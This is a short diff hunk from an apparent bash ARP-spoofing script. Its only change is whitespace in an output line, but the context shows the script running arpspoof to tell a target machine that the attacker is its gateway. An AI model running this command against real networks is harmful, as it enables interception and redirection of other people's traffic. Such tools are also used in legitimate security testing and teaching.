@@ -100,7 +100,7 @@ fi
 
 echo -e "${PURPLE}[+] IP to Spoof   : $ori_ip${NONE}";
 echo -e "${YELLOW}[+] IP of Gateway : $spoof_ip${NONE}";
-echo -e "${CYAN}[+]Interface       : $inter${NONE}"
+echo -e "${CYAN}[+]Interface      : $inter${NONE}"
 
 echo -e "${GREEN}[+] Telling $ori_ip that I am $spoof_ip ${NONE}"
 xterm -e $(which arpspoof) -i $inter -t $ori_ip $spoof_ip &
